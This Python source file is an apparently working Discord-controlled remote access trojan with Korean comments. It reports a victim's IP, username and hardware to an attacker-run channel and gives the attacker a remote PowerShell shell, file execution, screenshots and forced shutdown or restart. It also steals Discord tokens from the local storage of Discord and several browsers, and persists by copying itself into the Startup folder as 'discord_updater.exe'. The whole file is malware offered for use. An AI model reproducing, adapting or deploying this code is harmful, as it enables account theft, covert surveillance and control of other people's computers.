from typing import cast
import json
import os
import re
import shutil
import sys

from discord import Bot, Embed, ApplicationContext, Option, File
import pyautogui
import requests
import subprocess

commands = "\n".join([  # 명령어 목록
    ">help - help command",
    ">ls - show directory",
    ">shell - execute script",
    ">run <filename> - run an file",
    ">startup - add to startup",
    ">shutdown - shutdown victim's computer",
    ">restart - restart victim's computer",
    ">token - grab tokens",
    ">cd - change directory",
    ">screenshot - took a picture of victim's computer"
    ">exit - exit the program",
])


def res_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)


def get_processor():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"],
        stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]


def get_gpu():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"],
        stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]


def get_os():
    stdout = subprocess.Popen(
        ["powershell.exe",
         "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"],
        stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]


try:
    with open("bot_conf.json", "r", encoding="utf-8") as f:
        config = json.loads(f.read())
except Exception as e:
    print(e)

bot = Bot()
session_id = os.urandom(8).hex()  # 해킹에 성공했을 때 만들어지는 피해자를 목록별로 구분하기 위한 세션
bot_token = config["token"]
guild_id = config["guild_id"]


@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip = requests.get("https://api.ipify.org").text
    embed = Embed(title="새 세션이 생성되었습니다!", description="", color=0x1ABC9C)
    embed.add_field(name="세션 ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="유저이름", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="🛰️  네트워크 정보", value=f"```아이피: {ip}```", inline=False)
    sys_info = "\n".join([
        f"OS: {get_os()}",
        f"CPU: {get_processor()}",
        f"GPU: {get_gpu()}"
    ])
    embed.add_field(name="🖥️  시스템 정보", value=f"```{sys_info}```", inline=False)
    embed.add_field(name="🤖  명령어 목록", value=f"```{commands}```", inline=False)

    await channel.send(embed=embed)


@bot.slash_command(name="help", description="명령어 목록을 보여줍니다.", guild_ids=[guild_id])
async def show_help(context: ApplicationContext):
    embed = Embed(title="명령어 목록", description=f"```{commands}```", color=0x1ABC9C)
    await context.respond(embed=embed)


@bot.slash_command(name="cd", descripton="폴더를 변경합니다.", guild_ids=[guild_id])
async def change_directory(context: ApplicationContext, directory: Option(str, name="폴더명", description="이동할 폴더명")):
    try:
        os.chdir(directory)
        embed = Embed(title="디렉토리 변경됨", description=f"```{os.getcwd()}```", color=0x1ABC9C)
    except OSError:
        embed = Embed(title="실패", description=f"```디렉토리 변경을 실패했습니다.```", color=0x1ABC9C)
    await context.respond(embed=embed)


@bot.slash_command(name="ls", description="현재 폴더의 파일들과 폴더들을 보여줍니다.", guild_ids=[guild_id])
async def execute_ls(context: ApplicationContext):
    files = "\n".join(os.listdir())

    if not files:
        files = "디렉토리가 비여있습니다."

    embed = Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0x1ABC9C)
    await context.respond(embed=embed)


@bot.slash_command(name="shell", description="명령어를 실행합니다.", guild_ids=[guild_id])
async def execute_command(context: ApplicationContext, command=Option(str, name="명령어", description="실행할 명령어")):
    output = subprocess.Popen(
        ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
        shell=True
    ).communicate()[0].decode("utf-8")

    if not output:
        output = "결과가 출력되지 않았습니다."

    embed = Embed(title=f"쉘 접속됨 > {os.getcwd()}", description=f"```{output}```", color=0x1ABC9C)
    await context.respond(embed=embed)


@bot.slash_command(name="run", description="파일을 실행합니다", guild_ids=[guild_id])
async def run_file(context: ApplicationContext, file=Option(str, name="파일명", description="실행할 파일명")):
    subprocess.Popen(cast(file, str), shell=True)

    embed = Embed(title="파일 실행 완료", description=f"```{file}```", color=0x1ABC9C)
    await context.respond(embed=embed)


@bot.slash_command(name="exit", description="봇을 종료합니다", guild_ids=[guild_id])
async def close_bot(context: ApplicationContext):
    await context.channel.delete()
    await bot.close()


@bot.slash_command(name="screenshot", description="스크린샷을 찍습니다", guild_ids=[guild_id])
async def take_screenshot(context: ApplicationContext):
    screenshot = pyautogui.screenshot()
    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
    screenshot.save(path)
    file = File(path)
    embed = Embed(title="스크린샷 촬영 완료", color=0x1ABC9C)
    embed.set_image(url="attachment://screenshot.png")
    await context.respond(embed=embed, file=file)


@bot.slash_command(name="token", description="디스코드 토큰을 찾습니다", guild_ids=[guild_id])
async def find_token(context: ApplicationContext):
    paths = [
        os.path.join(os.getenv("APPDATA"), ".discord", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), ".discordcanary", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), ".discordptb", "Local Storage", "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage",
                     "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default", "Local Storage",
                     "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage",
                     "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default",
                     "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera", "Local Storage", "leveldb"),
    ]
    tokens: list[str] = []
    for path in paths:
        if not os.path.exists(path):
            continue

        for file in os.listdir(path):
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue

            for line in [x.strip() for x in open(os.path.join(path, file), errors="ignore").readlines() if
                         x.strip()]:
                # 토큰 찾는 정규식
                for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"]:
                    for token in re.findall(regex, line):
                        tokens.append(token)

    result_tokens = "\n".join(tokens)
    if not result_tokens:
        result_tokens = "디스코드 토큰을 찾지 못했습니다."

    embed = Embed(title="토큰", description=f"```{result_tokens}```", color=0x1ABC9C)
    await context.respond(embed=embed)


@bot.slash_command(name="startup", description="시작프로그램을 등록합니다", guild_ids=[guild_id])
async def register_startup_program(context: ApplicationContext):
    path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        shutil.copyfile(os.path.join(os.getcwd(), __file__), os.path.join(path, "discord_updater.exe"))
        embed = Embed(title="시작프로그램 등록 성공", description=f"```{os.path.join(path, 'discord_updater.exe')}```",
                      color=0x1ABC9C)
    except shutil.Error:
        embed = Embed(title="오류", description=f"```시작프로그램 등록을 실패했습니다.```", color=0x1ABC9C)

    await context.respond(embed=embed)


@bot.slash_command(name="shutdown", description="컴퓨터를 종료합니다.", guild_ids=[guild_id])
async def shutdown_computer(context: ApplicationContext):
    await context.channel.delete()
    await bot.close()
    os.system("shutdown /s /t 0")


@bot.slash_command(name="restart", description="컴퓨터를 다시 시작합니다.", guild_ids=[guild_id])
async def restart_computer(context: ApplicationContext):
    await context.channel.delete()
    await bot.close()
    os.system("shutdown /r /t 0")


bot.run(bot_token)
